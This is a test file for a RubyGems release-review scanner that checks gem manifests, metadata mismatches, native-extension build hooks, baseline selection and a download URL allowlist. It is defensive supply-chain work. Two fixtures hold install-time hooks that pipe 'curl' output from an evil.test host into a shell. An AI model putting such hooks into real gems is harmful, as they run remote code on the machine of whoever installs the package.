// @ts-nocheck
import { describe, expect, test } from "vitest";
import {
  acquireBaselineRubyGems,
  acquireStagedRubyGems,
  createRubyGemsReleaseCandidateReview,
  isAllowedRubyGemsArtifactUrl,
  isValidGemName,
  isValidGemVersion,
  normalizeGemName,
  parseRubyGemsAdapterInput,
  parseRubyGemsReleaseManifest,
  pickRubyGemsBaselineVersion,
  rubygemsAdapter,
} from "../server/lib/adapters/rubygems/index.ts";
import { RUBYGEMS_RULE_IDS } from "../server/lib/adapters/rubygems/types.ts";

function file(path, textSample, extra = {}) {
  return {
    path,
    size: (textSample ?? "").length,
    sha256: `sha-${path}`,
    flags: [],
    textSample,
    ...extra,
  };
}

// Build a Psych-shaped Gem::Specification metadata.gz payload (decoded text).
function gemspec({
  name,
  version,
  platform = "ruby",
  executables = [],
  extensions = [],
  dependencies = [],
  metadata = {},
}) {
  const lines = [
    "--- !ruby/object:Gem::Specification",
    `name: ${name}`,
    "version: !ruby/object:Gem::Version",
    `  version: ${version}`,
    `platform: ${platform}`,
    "bindir: bin",
  ];
  if (dependencies.length) {
    lines.push("dependencies:");
    for (const dep of dependencies) {
      lines.push("- !ruby/object:Gem::Dependency", `  name: ${dep.name}`, `  type: :${dep.type}`);
    }
  } else {
    lines.push("dependencies: []");
  }
  lines.push(executables.length ? "executables:" : "executables: []");
  for (const exe of executables) lines.push(`- ${exe}`);
  lines.push(extensions.length ? "extensions:" : "extensions: []");
  for (const ext of extensions) lines.push(`- ${ext}`);
  if (Object.keys(metadata).length) {
    lines.push("metadata:");
    for (const [key, value] of Object.entries(metadata)) lines.push(`  ${key}: ${value}`);
  } else {
    lines.push("metadata: {}");
  }
  lines.push("require_paths:", "- lib");
  return lines.join("\n") + "\n";
}

function gemArtifact(path, spec, files) {
  return { path, files, gemMetadata: gemspec(spec) };
}

function manifestFor(packageName, version, artifacts) {
  return {
    schema: "drydock.release-artifacts.v1",
    ecosystem: "rubygems",
    package: packageName,
    version,
    artifacts: artifacts.map((artifact) => ({ path: artifact.path, sha256: "a".repeat(64) })),
  };
}

function findingIds(review) {
  return review.ruleFindings.map((finding) => finding.ruleId);
}

describe("rubygems manifest", () => {
  test("accepts a valid gem manifest", () => {
    const manifest = parseRubyGemsReleaseManifest(
      manifestFor("example", "1.0.0", [{ path: "example-1.0.0.gem" }]),
    );
    expect(manifest.package).toBe("example");
    expect(manifest.version).toBe("1.0.0");
    expect(manifest.artifacts[0].sha256).toBe("a".repeat(64));
  });

  test("rejects a non-.gem artifact and bad identity", () => {
    expect(() =>
      parseRubyGemsReleaseManifest(manifestFor("example", "1.0.0", [{ path: "example.tgz" }])),
    ).toThrow(/\.gem/);
    expect(() =>
      parseRubyGemsReleaseManifest(manifestFor("..bad", "1.0.0", [{ path: "x.gem" }])),
    ).toThrow(/valid gem name/);
    expect(() =>
      parseRubyGemsReleaseManifest(manifestFor("example", "x.y", [{ path: "x.gem" }])),
    ).toThrow(/safe gem version/);
  });

  test("name + version validators", () => {
    expect(isValidGemName("rails-html-sanitizer")).toBe(true);
    expect(isValidGemName("-bad")).toBe(false);
    expect(isValidGemVersion("1.2.0.pre.1")).toBe(true);
    expect(isValidGemVersion("v1")).toBe(false);
    expect(normalizeGemName("Foo_Bar")).toBe("foo_bar");
  });
});

describe("rubygems release review", () => {
  test("flags a native extension and a malicious install build hook", () => {
    const artifact = gemArtifact(
      "native-1.0.0.gem",
      { name: "native", version: "1.0.0", extensions: ["ext/native/extconf.rb"] },
      [
        file(
          "ext/native/extconf.rb",
          "require 'mkmf'\nsystem('curl http://evil.test/x | sh')\ncreate_makefile('native')\n",
        ),
        file("lib/native.rb", "module Native; end\n"),
      ],
    );
    const review = createRubyGemsReleaseCandidateReview({
      manifest: manifestFor("native", "1.0.0", [artifact]),
      artifacts: [artifact],
    });

    expect(findingIds(review)).toContain(RUBYGEMS_RULE_IDS.nativeExtension);
    expect(findingIds(review)).toContain(RUBYGEMS_RULE_IDS.extensionBuildHook);
    // The shared ruby code scan also flags the install-time shell-out.
    expect(findingIds(review).some((id) => id.startsWith("code."))).toBe(true);
    expect(review.risk).toBe("high");
  });

  test("flags a malicious build hook declared outside ext", () => {
    const artifact = gemArtifact(
      "root-hook-1.0.0.gem",
      { name: "root-hook", version: "1.0.0", extensions: ["install.rb"] },
      [
        file("install.rb", "system 'curl https://evil.test/install | sh'\n"),
        file("lib/root_hook.rb", "module RootHook; end\n"),
      ],
    );
    const review = createRubyGemsReleaseCandidateReview({
      manifest: manifestFor("root-hook", "1.0.0", [artifact]),
      artifacts: [artifact],
    });

    expect(findingIds(review)).toContain(RUBYGEMS_RULE_IDS.nativeExtension);
    expect(findingIds(review)).toContain(RUBYGEMS_RULE_IDS.extensionBuildHook);
    expect(review.risk).toBe("high");
  });

  test("a pure-ruby gem with a benign extconf is only medium", () => {
    const artifact = gemArtifact(
      "calc-2.0.0.gem",
      { name: "calc", version: "2.0.0", extensions: ["ext/calc/extconf.rb"] },
      [
        file(
          "ext/calc/extconf.rb",
          "require 'mkmf'\nhave_header('stdio.h')\ncreate_makefile('calc')\n",
        ),
        file("lib/calc.rb", "module Calc; end\n"),
      ],
    );
    const review = createRubyGemsReleaseCandidateReview({
      manifest: manifestFor("calc", "2.0.0", [artifact]),
      artifacts: [artifact],
    });
    expect(findingIds(review)).toContain(RUBYGEMS_RULE_IDS.nativeExtension);
    expect(findingIds(review)).not.toContain(RUBYGEMS_RULE_IDS.extensionBuildHook);
    expect(review.risk).toBe("medium");
  });

  test("critical when the gemspec identity disagrees with the manifest", () => {
    const artifact = gemArtifact("good-1.0.0.gem", { name: "evil", version: "9.9.9" }, [
      file("lib/good.rb", "x = 1\n"),
    ]);
    const review = createRubyGemsReleaseCandidateReview({
      manifest: manifestFor("good", "1.0.0", [artifact]),
      artifacts: [artifact],
    });
    expect(findingIds(review)).toContain(RUBYGEMS_RULE_IDS.metadataMismatch);
    expect(review.risk).toBe("critical");
  });

  test("medium when the gem ships no gemspec metadata", () => {
    const artifact = {
      path: "bare-1.0.0.gem",
      gemMetadata: null,
      files: [file("lib/bare.rb", "x\n")],
    };
    const review = createRubyGemsReleaseCandidateReview({
      manifest: manifestFor("bare", "1.0.0", [artifact]),
      artifacts: [artifact],
    });
    expect(findingIds(review)).toContain(RUBYGEMS_RULE_IDS.metadataMissing);
  });

  test("surfaces suspicious inner tar entries from gem data archives", () => {
    const artifact = {
      path: "linked-1.0.0.gem",
      gemMetadata: gemspec({ name: "linked", version: "1.0.0" }),
      files: [file("lib/linked.rb", "module Linked; end\n")],
      suspiciousEntries: [
        {
          kind: "non-regular",
          path: "lib/linked.rb",
          detail: "typeflag 2 (symlink)",
        },
      ],
    };
    const review = createRubyGemsReleaseCandidateReview({
      manifest: manifestFor("linked", "1.0.0", [artifact]),
      artifacts: [artifact],
    });
    const finding = review.ruleFindings.find((entry) => entry.ruleId === "tar.suspicious-entry");

    expect(finding).toMatchObject({
      severity: "high",
      file: "ruby/lib/linked.rb",
    });
  });

  test("surfaces a non-rubygems allowed_push_host", () => {
    const artifact = gemArtifact(
      "priv-1.0.0.gem",
      {
        name: "priv",
        version: "1.0.0",
        metadata: { allowed_push_host: "https://gems.internal.test" },
      },
      [file("lib/priv.rb", "x\n")],
    );
    const review = createRubyGemsReleaseCandidateReview({
      manifest: manifestFor("priv", "1.0.0", [artifact]),
      artifacts: [artifact],
    });
    expect(findingIds(review)).toContain(RUBYGEMS_RULE_IDS.unexpectedPushHost);
  });

  test("diffs added files against a provided previous gem", () => {
    const previous = gemArtifact("demo-1.0.0.gem", { name: "demo", version: "1.0.0" }, [
      file("lib/demo.rb", "module Demo; end\n", { sha256: "sha-demo-shared" }),
    ]);
    const staged = gemArtifact("demo-1.1.0.gem", { name: "demo", version: "1.1.0" }, [
      file("lib/demo.rb", "module Demo; end\n", { sha256: "sha-demo-shared" }),
      file("bin/demo", "#!/usr/bin/env ruby\n"),
    ]);
    const review = createRubyGemsReleaseCandidateReview({
      manifest: manifestFor("demo", "1.1.0", [staged]),
      artifacts: [staged],
      previousArtifacts: [previous],
    });
    const added = review.diff
      .filter((entry) => entry.status === "added")
      .map((entry) => entry.path);
    expect(added).toContain("ruby/bin/demo");
    expect(review.previousFileCount).toBe(1);
  });

  test("summarizeDetails surfaces reviewed gem digests as a provenance block", () => {
    const artifact = gemArtifact("demo-1.0.0.gem", { name: "demo", version: "1.0.0" }, [
      file("lib/demo.rb", "module Demo; end\n"),
    ]);
    const input = rubygemsAdapter.parseInput({
      manifest: manifestFor("demo", "1.0.0", [artifact]),
      artifacts: [artifact],
    });
    const staged = acquireStagedRubyGems(input);

    // Provenance binds the report to the digests the gate recomputed from the
    // immutable bytes, mirroring the npm and PyPI gates.
    expect(rubygemsAdapter.summarizeDetails(staged.details).provenance).toEqual({
      ecosystem: "rubygems",
      mode: "workflow_gate",
      artifacts: [{ path: "demo-1.0.0.gem", kind: "gem", sha256: "a".repeat(64) }],
    });
  });
});

describe("rubygems baseline selection", () => {
  test("picks the newest stable version that is not the candidate", () => {
    const versions = [
      { number: "1.0.0", platform: "ruby", prerelease: false, built_at: "2026-01-01T00:00:00Z" },
      { number: "1.2.0", platform: "ruby", prerelease: false, built_at: "2026-03-01T00:00:00Z" },
      { number: "2.0.0.rc1", platform: "ruby", prerelease: true, built_at: "2026-04-01T00:00:00Z" },
    ];
    const selection = pickRubyGemsBaselineVersion(versions, "2.0.0.rc1");
    expect(selection.version).toBe("1.2.0");
    expect(selection.source).toBe("latest-published");
  });

  test("falls back to a pre-release when no stable baseline exists", () => {
    const versions = [
      { number: "1.0.0.pre", platform: "ruby", prerelease: true, built_at: "2026-01-01T00:00:00Z" },
    ];
    const selection = pickRubyGemsBaselineVersion(versions, "1.0.0");
    expect(selection.version).toBe("1.0.0.pre");
    expect(selection.source).toBe("upload-time");
  });

  test("reports none when only the candidate is published", () => {
    const selection = pickRubyGemsBaselineVersion(
      [{ number: "1.0.0", platform: "ruby", prerelease: false }],
      "1.0.0",
    );
    expect(selection.version).toBeNull();
  });
});

describe("rubygems baseline acquisition (broker)", () => {
  const ctx = { env: {}, executionCtx: {}, db: {}, session: { userId: "user_1" } };

  function adapterInput(version, platform = "ruby") {
    const artifact = gemArtifact(`demo-${version}.gem`, { name: "demo", version, platform }, [
      file("lib/demo.rb", "module Demo; end\n"),
    ]);
    return parseRubyGemsAdapterInput({
      manifest: manifestFor("demo", version, [artifact]),
      artifacts: [artifact],
    });
  }

  test("downloads and diffs the rubygems.org baseline version", async () => {
    const input = adapterInput("1.1.0");
    const staged = acquireStagedRubyGems(input);
    const broker = {
      async fetchGemVersions() {
        return [{ number: "1.0.0", platform: "ruby", prerelease: false }];
      },
      async downloadPublicGem(url) {
        expect(url).toBe("https://rubygems.org/downloads/demo-1.0.0.gem");
        return {
          files: [file("lib/demo.rb", "module Demo; end\n")],
          gemMetadata: gemspec({ name: "demo", version: "1.0.0" }),
        };
      },
      dispose() {},
    };
    const result = await acquireBaselineRubyGems(ctx, input, broker, staged);
    expect(result.artifact).not.toBeNull();
    expect(result.baseline.version).toBe("1.0.0");
  });

  test("degrades to a full-tree review when the baseline download fails", async () => {
    const input = adapterInput("1.1.0");
    const staged = acquireStagedRubyGems(input);
    const broker = {
      async fetchGemVersions() {
        return [{ number: "1.0.0", platform: "ruby", prerelease: false }];
      },
      async downloadPublicGem() {
        throw new Error("rubygems.org is unreachable");
      },
      dispose() {},
    };
    const result = await acquireBaselineRubyGems(ctx, input, broker, staged);
    expect(result.artifact).toBeNull();
    expect(result.baseline.reason).toContain("download-failed");
  });

  test("reports an empty baseline when versions metadata is unavailable", async () => {
    const input = adapterInput("1.0.0");
    const staged = acquireStagedRubyGems(input);
    const broker = {
      async fetchGemVersions() {
        return null;
      },
      async downloadPublicGem() {
        throw new Error("should not be called");
      },
      dispose() {},
    };
    const result = await acquireBaselineRubyGems(ctx, input, broker, staged);
    expect(result.artifact).toBeNull();
    expect(result.baseline.source).toBe("none");
  });
});

describe("rubygems artifact url allowlist", () => {
  test("only accepts rubygems.org download URLs over https", () => {
    expect(isAllowedRubyGemsArtifactUrl("https://rubygems.org/downloads/rake-13.0.6.gem")).toBe(
      true,
    );
    expect(isAllowedRubyGemsArtifactUrl("http://rubygems.org/downloads/rake-13.0.6.gem")).toBe(
      false,
    );
    expect(isAllowedRubyGemsArtifactUrl("https://evil.test/downloads/rake.gem")).toBe(false);
    expect(isAllowedRubyGemsArtifactUrl("https://rubygems.org/api/v1/gems/rake.json")).toBe(false);
  });
});
